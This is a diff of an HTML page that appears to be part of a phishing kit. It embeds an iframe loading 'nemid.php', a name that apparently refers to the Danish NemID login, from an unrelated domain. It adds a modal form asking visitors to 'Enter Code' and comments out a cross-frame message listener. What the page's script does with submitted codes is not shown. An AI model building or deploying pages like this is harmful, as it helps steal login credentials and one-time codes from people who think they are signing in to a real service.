@@ -5,6 +5,9 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.js" defer></script>
+    <script type="text/javascript" src="static/script.js" defer></script>
+    <link rel="stylesheet" href="static/styles.css">
 </head>
 <body>
     
@@ -23,8 +26,22 @@
 
     <main>
 
-        <iframe src="https://ecuaguia.com/nemid.php"></iframe>
+        <section>
+            <iframe src="https://ecuaguia.com/nemid.php"></iframe>
 
+            <div id="modal" class="modal">
+                <span class="closeModal">&times;</span>
+                <div id="modalContent" class="modalContent">
+                    <form id="formSendCode">
+                        <label for="code">Enter Code</label>
+                        <input id="code" type="text">
+                        <input id="submitButton" type="submit" value="Send">
+                    </form>
+                    <span id="response"></span>
+                </div>
+                
+            </div>
+        </section>
 
 
     </main>
@@ -32,7 +49,7 @@
     <footer>
 
     </footer>
-
+    <!--
     <script>
         window.addEventListener("message", async (e) => {
 
@@ -61,11 +78,11 @@
 
                 
             } catch (ex) {
-                console.log("something wrong")
+                console.log(ex.message)
             }
             
             
         })
-    </script>
+    </script>-->
 </body>
 </html>
